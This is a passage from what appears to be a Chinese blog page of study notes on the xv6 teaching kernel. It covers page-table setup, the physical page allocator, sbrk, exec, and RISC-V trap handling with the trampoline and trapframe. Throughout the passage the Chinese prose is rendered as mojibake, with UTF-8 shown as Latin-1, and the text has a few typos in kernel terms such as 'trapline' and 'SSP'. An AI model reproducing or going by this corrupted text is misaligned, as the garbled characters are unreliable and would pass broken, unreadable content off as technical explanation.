¸åœ°å€ç©ºé—´</h3><p>#todo</p><h3 id="ä»£ç ï¼šåˆ›å»ºä¸€ä¸ªåœ°å€ç©ºé—´"><a href="#ä»£ç ï¼šåˆ›å»ºä¸€ä¸ªåœ°å€ç©ºé—´" class="headerlink" title="ä»£ç ï¼šåˆ›å»ºä¸€ä¸ªåœ°å€ç©ºé—´"></a>ä»£ç ï¼šåˆ›å»ºä¸€ä¸ªåœ°å€ç©ºé—´</h3><p>å¤§å¤šæ•°å¤„ç†åœ°å€ç©ºé—´å’Œé¡µè¡¨çš„ä»£ç åœ¨ <code>kernel/vm.c</code> ä¸­</p><p>æ•°æ®ç»“æ„ pagetable_tï¼Œæ˜¯æŒ‡å‘ RISC-V æ ¹é¡µè¡¨çš„æŒ‡é’ˆ <code>typedef uint64 *pagetable_t</code>ï¼Œå®ƒå¯ä»¥æ˜¯å†…æ ¸æˆ–æ¯ä¸ªè¿›ç¨‹çš„é¡µè¡¨</p><ul><li>ä¸­å¿ƒå‡½æ•°æ˜¯ walk å’Œ mappages<ul><li>walkï¼šä»é¡µè¡¨ä¸­æŸ¥æ‰¾è™šæ‹Ÿåœ°å€å¯¹åº”çš„ PTE</li><li>mappagesï¼šä¸ºæ–°æ˜ å°„å®‰è£… PTE</li></ul></li><li>kvm å¼€å¤´çš„å‡½æ•°æ“ä½œå†…æ ¸é¡µè¡¨</li><li>uvm å¼€å¤´çš„å‡½æ•°æ“ä½œç”¨æˆ·é¡µè¡¨</li><li><code>copyin</code> å’Œ <code>copyout</code> ç”¨äºç”¨æˆ·ä¸å†…æ ¸ä¹‹é—´ä¼ è¾“æ•°æ®</li></ul><h4 id="ç³»ç»Ÿå¯åŠ¨"><a href="#ç³»ç»Ÿå¯åŠ¨" class="headerlink" title="ç³»ç»Ÿå¯åŠ¨"></a>ç³»ç»Ÿå¯åŠ¨</h4><p>ä¸€å¼€å§‹ï¼Œmain è°ƒç”¨ <code>kvminit</code> æ¥ä½¿ç”¨ <code>kvmmake</code> åˆ›å»ºå†…æ ¸é¡µè¡¨ï¼Œåœ¨æ­¤ä¹‹å‰ï¼Œåœ°å€ç›´æ¥æ˜ å°„åˆ°ç‰©ç†å†…å­˜</p><p>ç„¶åè°ƒç”¨ <code>kvminithart</code> æ¥å®‰è£…å†…æ ¸é¡µè¡¨ï¼Œå°†æ ¹é¡µè¡¨çš„ç‰©ç†åœ°å€å†™å…¥ satp å¯„å­˜å™¨ï¼Œåœ¨æ­¤ä¹‹å CPU ä¼šä½¿ç”¨å†…æ ¸é¡µè¡¨è½¬æ¢åœ°å€</p><p><strong>kvmmake</strong> </p><ul><li>é¦–å…ˆåˆ†é…ä¸€é¡µç‰©ç†å†…å­˜æ¥ä¿å­˜æ ¹é¡µè¡¨</li><li>ç„¶åè°ƒç”¨ <code>kvmmap</code> æ¥å®‰è£…å†…æ ¸éœ€è¦çš„ PTE<ul><li>åŒ…æ‹¬å†…æ ¸çš„æŒ‡ä»¤å’Œæ•°æ®ï¼Œæœ€é«˜åˆ° PHYSTOP çš„ç‰©ç†å†…å­˜ï¼Œè®¾å¤‡çš„å†…å­˜èŒƒå›´</li></ul></li><li>ç„¶åè°ƒç”¨ <code>proc_mapstacks</code> ç»™æ¯ä¸ªè¿›ç¨‹åˆ†é…ä¸€ä¸ªå†…æ ¸æ ˆ<ul><li>å®ƒè°ƒç”¨ kvmmap æŠŠæ¯ä¸ªæ ˆæ˜ å°„åˆ° KSTACK ç”Ÿæˆçš„è™šæ‹Ÿåœ°å€ï¼Œç•™å‡ºäº†ä¿æŠ¤é¡µçš„ç©ºé—´</li></ul></li></ul><p><strong>kvmmap</strong></p><ul><li>è°ƒç”¨ <code>mappages</code> å®‰è£… PTE</li></ul><p><strong>mappages</strong></p><ul><li>å®ƒå¯¹æ¯ä¸ªè™šæ‹Ÿåœ°å€å…ˆè°ƒç”¨ walk æŸ¥æ‰¾å¯¹åº”çš„ PTE åœ°å€</li><li>ç„¶ååˆå§‹åŒ– PTE ä¿å­˜å¯¹åº”çš„ PPN å’Œ æƒé™æ ‡å¿—ä½</li></ul><p><strong>walk</strong></p><ul><li>å®ƒå¯¹ä¸‰çº§é¡µè¡¨è¿›è¡ŒæŸ¥è¯¢å¯¹åº”çš„ PTE</li><li>è‹¥ PTE æ— æ•ˆä¸”è®¾ç½®äº† alloc å‚æ•°ï¼Œwalk ä¼šåˆ†é…ä¸€ä¸ªæ–°çš„é¡µé¢ï¼Œå¹¶æŠŠç‰©ç†åœ°å€æ”¾å…¥ PTE</li><li>æœ€åè¿”å›ç¬¬ä¸‰çº§é¡µè¡¨çš„ PTE åœ°å€</li></ul><h3 id="ç‰©ç†å†…å­˜åˆ†é…"><a href="#ç‰©ç†å†…å­˜åˆ†é…" class="headerlink" title="ç‰©ç†å†…å­˜åˆ†é…"></a>ç‰©ç†å†…å­˜åˆ†é…</h3><p>xv6 åœ¨å†…æ ¸ç»“å°¾ä¸ PHSYTOP ä¹‹é—´åˆ†é…è¿è¡Œæ—¶å†…å­˜ï¼Œä¸€æ¬¡åˆ†é…å’Œé‡Šæ”¾ 4KB</p><p>xv6 è¿½è¸ªå“ªäº›é¡µé¢æ˜¯ freedï¼Œé€šè¿‡å»ºç«‹ä¸€ä¸ªé“¾è¡¨</p><p>åˆ†é…åŒ…æ‹¬ä»é“¾è¡¨ä¸­ç§»é™¤ï¼Œé‡Šæ”¾åŒ…æ‹¬å°† freed é¡µåŠ å…¥ä»é“¾è¡¨ä¸­</p><h3 id="ä»£ç ï¼šç‰©ç†å†…å­˜åˆ†é…å™¨"><a href="#ä»£ç ï¼šç‰©ç†å†…å­˜åˆ†é…å™¨" class="headerlink" title="ä»£ç ï¼šç‰©ç†å†…å­˜åˆ†é…å™¨"></a>ä»£ç ï¼šç‰©ç†å†…å­˜åˆ†é…å™¨</h3><p>åˆ†é…å™¨ä½äº kernel/kalloc.c ä¸­</p><p>æ•°æ®ç»“æ„æ˜¯ä¸€ä¸ª free é“¾è¡¨ï¼Œæ¯ä¸ªå…ƒç´ æ˜¯ <code>struct run</code>ï¼Œé“¾è¡¨ç”±ä¸€ä¸ª spin lock ä¿æŠ¤ï¼Œé”è°ƒç”¨ <code>acquire</code> å’Œ <code>release</code>ï¼Œé“¾è¡¨å’Œé”è¢«åŒ…è£…åœ¨ kmem ç»“æ„ä½“ä¸­</p><figure class="highlight c"><figcaption><span>kernel/kalloc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">lock</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">freelist</span>;</span></span><br><span class="line">&#125; kmem;</span><br></pre></td></tr></table></figure><p>xv6 åº”è¯¥é€šè¿‡è§£æç¡¬ä»¶çš„é…ç½®ä¿¡æ¯æ¥å†³å®šæœ‰å¤šå°‘ç‰©ç†å†…å­˜å¯ç”¨</p><p>main å‡½æ•°è°ƒç”¨ <code>kinit</code> æ¥åˆå§‹åŒ–åˆ†é…å™¨</p><p><strong>kinit</strong></p><p>åˆå§‹åŒ– free é“¾è¡¨æ¥ä¿å­˜ free memory çš„æ¯ä¸€é¡µï¼ˆkernel æœ«å°¾ä¸ PHSYTOP ä¹‹é—´çš„å†…å­˜ç©ºé—´ï¼‰</p><p><code>kinit</code> è°ƒç”¨ <code>freerange</code> æ¥å¯¹æ¯ä¸€é¡µè°ƒç”¨ kfree å‘ free é“¾è¡¨æ·»åŠ å†…å­˜</p><p><code>freerange</code> ä½¿ç”¨ PGROUNDUP ç¡®ä¿ç‰©ç†åœ°å€å¯¹é½ï¼ˆç±»ä¼¼å‘ä¸Šå–æ•´ï¼‰</p><p><code>kfree</code> ä¼šå°†é‡Šæ”¾çš„é¡µé¢æ‰€æœ‰å€¼è®¾ä¸º 1ï¼Œç„¶åä½¿ç”¨å¤´æ’æ³•å°†é¡µé¢é¦–åœ°å€åŠ å…¥ free é“¾è¡¨</p><h3 id="è¿›ç¨‹åœ°å€ç©ºé—´"><a href="#è¿›ç¨‹åœ°å€ç©ºé—´" class="headerlink" title="è¿›ç¨‹åœ°å€ç©ºé—´"></a>è¿›ç¨‹åœ°å€ç©ºé—´</h3><p>æ¯ä¸ªè¿›ç¨‹æœ‰ä¸€ä¸ªå•ç‹¬çš„é¡µè¡¨</p><table><thead><tr><th>Address</th><th>section</th><th>Permission</th></tr></thead><tbody><tr><td>MAXVA</td><td>trapline</td><td>RXâ€“</td></tr><tr><td></td><td>trapframe</td><td>R-W-</td></tr><tr><td></td><td>unused</td><td></td></tr><tr><td></td><td>heap</td><td>R-WU</td></tr><tr><td></td><td>stack</td><td>R-WU</td></tr><tr><td></td><td>guard page</td><td></td></tr><tr><td></td><td>data</td><td>R-WU</td></tr><tr><td>Page aligned</td><td>unused</td><td></td></tr><tr><td>0</td><td>text</td><td>R-XU</td></tr></tbody></table><p>trampoline å’Œ trapframe æ˜ å°„åœ¨é«˜åœ°å€ï¼Œç”¨æˆ·æ¨¡å¼ä¸å¯è®¿é—®</p><p>trampolineï¼šåœ¨è°ƒç”¨ ecall æ—¶ä¼šè·³è½¬åˆ°è¿™é‡Œ</p><p>trapframeï¼šåœ¨è°ƒç”¨ ecall æ—¶ï¼Œç”¨æˆ·è¿›ç¨‹çš„é€šç”¨å¯„å­˜å™¨ä¼šä¿å­˜åœ¨è¿™é‡Œ</p><h3 id="ä»£ç ï¼šsbrk"><a href="#ä»£ç ï¼šsbrk" class="headerlink" title="ä»£ç ï¼šsbrk"></a>ä»£ç ï¼šsbrk</h3><p>ç³»ç»Ÿè°ƒç”¨ sbrk ç”¨äºè¿›ç¨‹å¢å‡å†…å­˜å¤§å°ï¼Œç”± growproc å®ç°</p><p>growproc æ ¹æ® n çš„æ­£è´Ÿï¼Œè°ƒç”¨ uvmalloc æˆ– uvmdealloc</p><p>uvmalloc è°ƒç”¨ kalloc åˆ†é…ç‰©ç†å†…å­˜ï¼Œç„¶åè°ƒç”¨ mappages å‘ç”¨æˆ·é¡µè¡¨æ·»åŠ  PTE</p><p>uvmdealloc è°ƒç”¨ uvmunmapï¼Œuvmunmap ä½¿ç”¨ walk æ‰¾åˆ°å¯¹åº”çš„ PTE å’Œ kfree é‡Šæ”¾ç‰©ç†å†…å­˜</p><h3 id="ä»£ç ï¼šexec"><a href="#ä»£ç ï¼šexec" class="headerlink" title="ä»£ç ï¼šexec"></a>ä»£ç ï¼šexec</h3><p>exec ä½¿ç”¨ namei æ‰“å¼€äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç„¶åè¯»å– ELF å¤´</p><p>ä¸€ä¸ª ELF æ–‡ä»¶åŒ…å«ä¸€ä¸ª ELF å¤´ï¼ˆstruct elfhdrï¼‰ï¼Œä¸€ç³»åˆ—ç¨‹åº section å¤´ï¼ˆstruct proghdrï¼‰ï¼Œæ¯ä¸ª struct proghdr æè¿°äº†ç¨‹åºå¿…é¡»åŠ è½½åˆ°å†…å­˜ä¸­çš„ sectionï¼Œxv6 ç¨‹åºæœ‰ä¸¤ä¸ªï¼Œä¸€ä¸ªæŒ‡ä»¤ï¼Œä¸€ä¸ªæ˜¯æ•°æ®</p><ul><li>ç¬¬ä¸€æ­¥æ˜¯æ£€æŸ¥æ–‡ä»¶æ˜¯å¦æ˜¯ ELF æ–‡ä»¶ï¼Œå®ƒä» 4 å­—èŠ‚çš„é­”æœ¯æ•°å­—å¼€å§‹ï¼ˆ0x7Fï¼Œâ€™Eâ€™ï¼Œâ€™Lâ€™ï¼Œâ€™Fâ€™ï¼Œæˆ–è€… ELF_MAGICï¼‰</li><li>ä½¿ç”¨ proc_pagetable åˆ†é…ä¸€ä¸ªæ²¡æœ‰ç”¨æˆ·æ˜ å°„çš„æ–°é¡µè¡¨ï¼Œç”¨ uvmalloc ç»™æ¯ä¸ª ELF æ®µåˆ†é…å†…å­˜ï¼Œç”¨ loadseg åŠ è½½æ¯ä¸ªæ®µåˆ°å†…å­˜ä¸­ï¼Œloadseg ä½¿ç”¨ walkaddr æ‰¾åˆ°ç‰©ç†åœ°å€å†™å…¥æ¯ä¸ªæ®µã€‚ä½¿ç”¨ readi è¯»å–æ¯ä¸ªæ®µ</li><li>åˆ†é…å¹¶åˆå§‹åŒ–ä¸€é¡µç”¨æˆ·æ ˆï¼Œå°†å‚æ•°å­—ç¬¦ä¸²å¤åˆ¶åˆ°æ ˆé¡¶ï¼Œåœ¨ ustack è®°å½•å­—ç¬¦ä¸²æŒ‡é’ˆï¼Œustack å‰ä¸‰ä¸ªæ˜¯ fake è¿”å›ç¨‹åºè®¡æ•°å™¨ï¼Œargc å’Œ argv</li><li>exec ä¼šåœ¨æ ˆé¡µçš„ä¸‹é¢æ”¾ä¸€ä¸ªä¸å¯è®¿é—®çš„é¡µ<ul><li>åœ¨å‡†å¤‡æ–°çš„å†…å­˜é•œåƒæ—¶ï¼Œå¦‚æœæ£€æµ‹åˆ°ä¸€ä¸ªé”™è¯¯ï¼ˆå¦‚æ— æ•ˆçš„ç¨‹åºæ®µï¼‰ï¼Œä¼šè·³è½¬åˆ° bad æ ‡ç­¾ï¼Œé‡Šæ”¾æ–°çš„é•œåƒï¼Œè¿”å› -1ã€‚ä¸€æ—¦é•œåƒå®Œæˆï¼Œexec æäº¤æ–°çš„é¡µè¡¨ï¼Œé‡Šæ”¾æ—§çš„</li></ul></li><li>exec ä»æ–‡ä»¶æŒ‡å®šçš„åœ°å€å°†æ•°æ®åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œå› æ­¤ exec æ˜¯æœ‰é£é™©çš„ï¼Œéœ€è¦æ‰§è¡Œå¾ˆå¤šæ£€æŸ¥</li></ul><h3 id="Real-world"><a href="#Real-world" class="headerlink" title="Real world"></a>Real world</h3><p>çœŸæ­£çš„å†…å­˜åˆ†é…å™¨éœ€è¦å¤„ç†å°åˆ†é…å’Œå¤§åˆ†é…</p><h2 id="Chapter-4-Traps-and-system-calls"><a href="#Chapter-4-Traps-and-system-calls" class="headerlink" title="Chapter 4 Traps and system calls"></a>Chapter 4 Traps and system calls</h2><p><em>trap</em>ï¼ˆé™·é˜±ï¼‰æ˜¯è®©CPU æç½®æ™®é€šæŒ‡ä»¤çš„æ‰§è¡Œï¼Œå¹¶å°†æ§åˆ¶æƒè½¬ç§»åˆ°å¤„ç†è¯¥äº‹ä»¶çš„ç‰¹æ®Šä»£ç </p><ul><li>ç³»ç»Ÿè°ƒç”¨</li><li>å¼‚å¸¸<ul><li>é™¤ä»¥ 0 æˆ–ä½¿ç”¨æ— æ•ˆçš„è™šæ‹Ÿåœ°å€ç­‰</li></ul></li><li>ä¸­æ–­<ul><li>è®¾å¤‡å‘å‡ºä¿¡å·ï¼Œå¦‚ç£ç›˜å®Œæˆè¯»å†™è¯·æ±‚æ—¶</li></ul></li></ul><p>é€šå¸¸ï¼Œtrap å‘ç”Ÿæ—¶æ‰§è¡Œçš„ä»£ç ä¸ä¹…åéƒ½éœ€è¦æ¢å¤ï¼Œä»£ç å¹¶ä¸éœ€è¦æ„è¯†åˆ°å‘ç”Ÿäº†ä»»ä½•ç‰¹æ®Šæƒ…å†µ</p><ul><li>å¼‚å¸¸å¤„ç†<ol><li>trap å¼ºåˆ¶å°†æ§åˆ¶æƒè½¬ç§»ç»™å†…æ ¸</li><li>å†…æ ¸ä¿å­˜å¯„å­˜å™¨å’Œå…¶ä»–çŠ¶æ€</li><li>å†…æ ¸æ‰§è¡Œå¤„ç†ä»£ç </li><li>å†…æ ¸æ¢å¤ä¿å­˜çš„å¯„å­˜å™¨å’ŒçŠ¶æ€å¹¶ä»é™·é˜±ä¸­è¿”å›</li><li>åŸå§‹ä»£ç ä»å®ƒåœæ­¢çš„åœ°æ–¹æ¢å¤</li></ol></li></ul><p>Xv6 åœ¨å†…æ ¸ä¸­å¤„ç†æ‰€æœ‰ trapï¼Œtrap ä¸ä¼šä¼ é€’ç»™ç”¨æˆ·ä»£ç </p><p><strong>éš”ç¦»</strong>è¦æ±‚åªæœ‰å†…æ ¸å¯ä»¥ä½¿ç”¨ç¡¬ä»¶è®¾å¤‡ï¼Œä¸”å†…æ ¸æ˜¯ä¸€ç§æ–¹ä¾¿çš„æœºåˆ¶ï¼Œå¯ä»¥åœ¨å¤šä¸ªè¿›ç¨‹ä¹‹é—´å…±äº«è®¾å¤‡ï¼Œä¸äº’ç›¸å¹²æ‰°ï¼Œè¿™å¯¹äºå¼‚å¸¸ä¹Ÿæœ‰æ„ä¹‰ï¼Œxv6 é€šè¿‡æ€æ­»è¿è§„ç¨‹åºæ¥å¤„ç†ç”¨æˆ·ç©ºé—´çš„æ‰€æœ‰å¼‚å¸¸</p><p>Xv6 å¤„ç† trap æœ‰å››ä¸ªé˜¶æ®µ</p><ol><li>RISC-V CPU è¿›è¡Œç¡¬ä»¶æ“ä½œ</li><li>ä¸€äº›ä¸ºå†…æ ¸ C ä»£ç åšå¥½å‡†å¤‡çš„æ±‡ç¼–æŒ‡ä»¤</li><li>å†³å®šå¦‚ä½•å¤„ç† trap çš„ C å‡½æ•°</li><li>ç³»ç»Ÿè°ƒç”¨æˆ–è®¾å¤‡é©±åŠ¨ç¨‹åºæœåŠ¡ä¾‹ç¨‹</li></ol><p>å¤„ç† trap çš„ä»£ç ï¼ˆæ±‡ç¼–æˆ– Cï¼‰è¢«ç§°ä¸º <em>handler</em></p><p>handler çš„ç¬¬ä¸€æ­¥é€šå¸¸ç”¨æ±‡ç¼–è¯­è¨€ç¼–å†™ï¼Œç§°ä¸º <em>vector</em></p><h3 id="RISC-V-trap-æœºåˆ¶"><a href="#RISC-V-trap-æœºåˆ¶" class="headerlink" title="RISC-V trap æœºåˆ¶"></a>RISC-V trap æœºåˆ¶</h3><h4 id="å¯„å­˜å™¨"><a href="#å¯„å­˜å™¨" class="headerlink" title="å¯„å­˜å™¨"></a>å¯„å­˜å™¨</h4><p>æ§åˆ¶å¯„å­˜å™¨ï¼šå†…æ ¸å¯è¯»å†™ï¼Œç”¨äºå‘Šè¯‰ CPU æ€ä¹ˆå¤„ç† trap</p><ul><li>stvecï¼šä¿å­˜å†…æ ¸å¤„ç† trap çš„åœ°å€ï¼Œå‘ç”Ÿ trap æ—¶ä¼šè·³è½¬åˆ°è¯¥åœ°å€<ul><li>Supervisor Trap Vector</li><li>ç”¨æˆ·æ¨¡å¼ä¸‹ä¼šæŒ‡å‘å†…æ ¸ä»£ç çš„ <code>usertrap</code></li><li>å†…æ ¸æ¨¡å¼ä¸‹ä¼šæŒ‡å‘å†…æ ¸ä»£ç çš„ <code>kerneltrap</code></li></ul></li><li>sepcï¼šå‘ç”Ÿ trap æ—¶ä¿å­˜å½“å‰çš„ pcï¼Œåœ¨ä½¿ç”¨ sret æŒ‡ä»¤æ—¶ï¼Œä¼šè·³è½¬åˆ° sepc æŒ‡å‘çš„åœ°å€<ul><li>Supervisor Exception Program Counter</li><li>sretï¼šä» trap è¿”å›</li><li>å†…æ ¸å¯æ§åˆ¶ sepc è®© sret è¿”å›åˆ°é€‚å½“çš„ä½ç½®</li></ul></li><li>scauseï¼šæè¿° trap ç±»å‹<ul><li>Supervisor Trap Cause</li><li>8 è¡¨ç¤ºç³»ç»Ÿè°ƒç”¨</li><li>å…¶ä»–è¡¨ç¤ºé”™è¯¯æˆ–è€…ä¸­æ–­</li></ul></li><li>sscatchï¼šè¾…åŠ©ä½œç”¨ï¼Œé˜²æ­¢åœ¨ä¿å­˜ç”¨æˆ·å¯„å­˜å™¨å‰å°†å…¶è¦†ç›–<ul><li>ä¸€èˆ¬ç”¨æ¥ä¿å­˜ a0</li><li><del>åœ¨ xv6 çš„ 2020 ç‰ˆæœ¬ç”¨æ¥ä¿å­˜ trapframe åœ°å€</del></li></ul></li><li>sstatusï¼šä»¥ bitmap å½¢å¼ä¿å­˜ä¸€äº›æ§åˆ¶ä¿¡æ¯<ul><li>Supervisor Status</li><li>SPPï¼šè¡¨ç¤º trap æ¥è‡ªç”¨æˆ·æ¨¡å¼ï¼ˆ0ï¼‰è¿˜æ˜¯ç®¡ç†è€…æ¨¡å¼ï¼ˆ1ï¼‰ï¼Œå¹¶ä¸”ç”¨æ¥å‘Šè¯‰ sret è¿”å›åˆ°å“ªä¸ªæ¨¡å¼</li><li>SIEï¼šè¡¨ç¤ºæ˜¯å¦å…è®¸è®¾å¤‡ä¸­æ–­ï¼Œè‹¥ä¸º 0 åˆ™ RISC-V ä¼šæ¨è¿Ÿè®¾å¤‡ä¸­æ–­</li></ul></li></ul><p>åœ¨æœºå™¨æ¨¡å¼ä¸‹æœ‰ä¸€ç»„ç±»ä¼¼çš„æ§åˆ¶å¯„å­˜å™¨ï¼Œxv6 åªåœ¨å®šæ—¶å™¨ä¸­æ–­çš„æƒ…å†µä¸‹ä½¿ç”¨</p><h4 id="å¤„ç†-trap-å‰"><a href="#å¤„ç†-trap-å‰" class="headerlink" title="å¤„ç† trap å‰"></a>å¤„ç† trap å‰</h4><p>ä¸‹é¢æ˜¯é™¤ å®šæ—¶å™¨ä¸­æ–­ å¤–çš„ trap</p><ol><li>å°† sstatus çš„ SIE ä½ ç½®é›¶<ul><li>å¦‚æœæ˜¯è®¾å¤‡ä¸­æ–­ï¼Œä¸ä¼šç»§ç»­ä¸‹é¢çš„æ“ä½œ</li></ul></li><li>å°† pc å¤åˆ¶ç»™ sepc</li><li>ä¿å­˜å½“å‰æ¨¡å¼åˆ° sstatus çš„ SSP </li><li>è®¾ç½® scause è¡¨ç¤º trap åŸå› </li><li>è®¾ç½®ä¸ºç®¡ç†è€…æ¨¡å¼</li><li>å°† stvec å¤åˆ¶ç»™ pc</li><li>å¼€å§‹æ‰§è¡Œæ–°çš„ pc æŒ‡å‘çš„æŒ‡ä»¤</li></ol><p><strong>æ³¨æ„</strong>ï¼šæ­¤æ—¶æ²¡æœ‰è½¬æ¢ä¸ºå†…æ ¸é¡µè¡¨ï¼Œæ²¡æœ‰è½¬æ¢ä¸ºå†…æ ¸æ ˆï¼Œä¹Ÿæ²¡æœ‰ä¿å­˜é™¤ pc å¤–çš„ä»»ä½•å¯„å­˜å™¨ï¼Œè¿™äº›éœ€è¦ç”±å†…æ ¸æ¥å®ç°</p><p>åŸå› ï¼šè¿™æ ·èƒ½æä¾›ç»™å†…æ ¸æ›´å¥½çš„çµæ´»æ€§ï¼Œä¾‹å¦‚åœ¨å†…æ ¸ä¸­å‘ç”Ÿ trap å¹¶ä¸éœ€è¦è½¬æ¢é¡µè¡¨ï¼Œå¯ä»¥æé«˜å¤„ç† trap çš„æ€§èƒ½</p><h4 id="ç›¸å…³çš„æ±‡ç¼–æŒ‡ä»¤"><a href="#ç›¸å…³çš„æ±‡ç¼–æŒ‡ä»¤" class="headerlink" title="ç›¸å…³çš„æ±‡ç¼–æŒ‡ä»¤"></a>ç›¸å…³çš„æ±‡ç¼–æŒ‡ä»¤</h4><ul><li>ecall<ul><li>environment call</li><li>ç³»ç»Ÿè°ƒç”¨ï¼Œä¸€ç§ trap</li></ul></li><li>sret<ul><li>Supervisor Return</li><li>å°†æ¨¡å¼ä»ç®¡ç†è€…æ¨¡å¼æ›´æ”¹ä¸ºæŒ‡å®šçš„æ¨¡å¼ï¼ˆsstatus çš„ SPP ä½ï¼‰</li><li>å°† sepc å¯„å­˜å™¨å¤åˆ¶ç»™ pc å¯„å­˜å™¨</li><li>å¯ç”¨è®¾å¤‡ä¸­æ–­ï¼ˆå°† sstatus çš„ SIE ä½è®¾ä¸º 1ï¼‰</li></ul></li><li>csrw<ul><li>å†™å…¥æ§åˆ¶å¯„å­˜å™¨ <code>csrw sscratch, a0</code></li></ul></li><li>csrr<ul><li>è¯»å–æ§åˆ¶å¯„å­˜å™¨ <code>csrr t0, sscratch</code></li></ul></li></ul><h3 id="ç”¨æˆ·-trap"><a href="#ç”¨æˆ·-trap" class="headerlink" title="ç”¨æˆ· trap"></a>ç”¨æˆ· trap</h3><p>æ¥è‡ªç”¨æˆ·ç©ºé—´çš„ trap çš„å¤„ç†æµç¨‹</p><ol><li><code>uservec</code>ï¼ˆkernel/trampoline.Sï¼‰</li><li><code>usertrap</code>ï¼ˆkernel/trap.cï¼‰</li><li><code>usertrapret</code>ï¼ˆkernel/trap.cï¼‰</li><li><code>userret</code>ï¼ˆkernel/trapline.Sï¼‰</li></ol><h4 id="trampoline"><a href="#trampoline" class="headerlink" title="trampoline"></a>trampoline</h4><p>ç”±äºRISC-V ç¡¬ä»¶åœ¨å‘ç”Ÿ trap æ—¶ä¸ä¼šè½¬æ¢é¡µè¡¨ï¼Œè¿™æ„å‘³ç€ stvec ä¿å­˜çš„åœ°å€ï¼ˆå¤„ç† trap çš„åœ°å€ï¼‰å¿…é¡»åœ¨ç”¨æˆ·é¡µè¡¨ä¸­å­˜åœ¨æœ‰æ•ˆæ˜ å°„ï¼Œå¹¶ä¸”åœ¨è½¬æ¢æˆå†…æ ¸é¡µè¡¨åï¼Œå¿…é¡»åœ¨å†…æ ¸é¡µè¡¨ä¸­ä¹Ÿå­˜åœ¨æœ‰æ•ˆæ˜ å°„</p><p>Xv6 ä½¿ç”¨äº†ä¸€ä¸ª <em>trampoline</em> é¡µè¡¨æ¥è§£å†³ä¸Šé¢çš„é™åˆ¶æ¡ä»¶</p><p>trampoline é¡µé¢åŒ…å« stvec æŒ‡å‘çš„ <code>uservec</code> ç¨‹åºå’Œç”¨äºè¿”å›åˆ°ç”¨æˆ·ä»£ç çš„ <code>userret</code> ç¨‹åº</p><p>trampoline åœ¨å†…æ ¸æ¯ä¸ªè¿›ç¨‹çš„é¡µè¡¨ä¸­éƒ½æ˜ å°„åˆ°äº† TRAMPOLINEï¼ˆ0x3ffffff000ï¼‰åœ°å€ä¸Šï¼Œä½äºè™šæ‹Ÿåœ°å€é¡¶éƒ¨ï¼Œå®ƒåªå…è®¸ç®¡ç†è€…æ¨¡å¼æ‰§è¡Œ</p><h4 id="trapframe"><a href="#trapframe" class="headerlink" title="trapframe"></a>trapframe</h4><p>é€šç”¨å¯„å­˜å™¨å†…å®¹ä¼šä¿å­˜åˆ°ä¸€ä¸ª trapframe ç»“æ„ä½“ï¼Œå®ƒé€šå¸¸åœ¨ç”¨æˆ·é¡µè¡¨ä¸­æ˜ å°„åˆ°ä¸ trampoline ç›¸é‚»çš„ä½ç½®ï¼ˆ0x3fffffe000ï¼‰ï¼Œä¸”ä¹Ÿåªå…è®¸ç®¡ç†è€…æ¨¡å¼è®¿é—®</p><p>å®ƒçš„ç‰©ç†åœ°å€ä¿å­˜åœ¨ proc ç»“æ„ä½“çš„ trapframe æˆå‘˜å˜é‡ä¸­ï¼Œä»¥ä¾¿å†…æ ¸èƒ½é€šè¿‡å†…æ ¸é¡µè¡¨ç›´æ¥è®¿é—®å®ƒ</p><figure class="highlight c"><figcaption><span>kernel/proc.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> &#123;</span></span><br><span class="line">  <span class="comment">/*   0 */</span> uint64 kernel_satp;   <span class="comment">// kernel page table</span></span><br><span class="line">  <span class="comment">/*   8 */</span> uint64 kernel_sp;     <span class="comment">// top of process&#x27;s kernel stack</span></span><br><span class="line">  <span class="comment">/*  16 */</span> uint64 kernel_trap;   <span class="comment">// usertrap()</span></span><br><span class="line">  <span class="comment">/*  24 */</span> uint64 epc;           <span class="comment">// saved user program counter</span></span><br><span class="line">  <span class="comment">/*  32 */</span> uint64 kernel_hartid; <span class="comment">// saved kernel tp</span></span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>kernel_satp<ul><li>ä¿å­˜ kernel é¡µè¡¨åœ°å€</li></ul></li><li>kernel_sp<ul><li>ä¿å­˜è¿›ç¨‹çš„å†…æ ¸æ ˆé¡¶åœ°å€</li></ul></li><li>kernel_trap<ul><li>ä¿å­˜å†…æ ¸ä»£ç ä¸­çš„ <code>usertrap</code> ä½ç½®</li></ul></li><li>epc<ul><li>ä¿å­˜ç”¨æˆ·çš„ pc</li><li>åœ¨ <code>usertrap()</code> ä¸­ä¼šå°† sepc å¯„å­˜å™¨å†…å®¹ä¿å­˜åˆ°è¿™é‡Œ</li><li>å› ä¸ºå¯èƒ½ä¼šè·³è½¬åˆ°å¦ä¸€ä¸ªç”¨æˆ·è¿›ç¨‹å»æ‰§è¡Œï¼Œsepc å¯„å­˜å™¨å¯èƒ½ä¼šè¢«æ›´æ”¹</li></ul></li><li>kernel_hartid<ul><li>CPU æ ¸å¿ƒ idï¼Œè¡¨ç¤ºè¯¥è¿›ç¨‹åœ¨å“ªä¸ª CPU æ ¸å¿ƒè¿è¡Œï¼Œä» 0 å¼€å§‹</li></ul></li><li>å‰©ä¸‹çš„æ˜¯é€šç”¨å¯„å­˜å™¨</li></ul><h4 id="uservec"><a href="#uservec" class="headerlink" title="uservec"></a>uservec</h4><p><code>uservec</code> ä»£ç ä½äº kernel/trampoline.S ä¸­</p><p>å®ƒçš„ä½œç”¨æ˜¯ä¿å­˜ç”¨æˆ·ä»£ç çš„é€šç”¨å¯„å­˜å™¨ï¼Œåˆ‡æ¢å†…æ ¸æ ˆã€å†…æ ¸é¡µè¡¨ç­‰ï¼Œè·³è½¬åˆ°å†…æ ¸ä¸­å¤„ç† trap çš„ä½ç½® 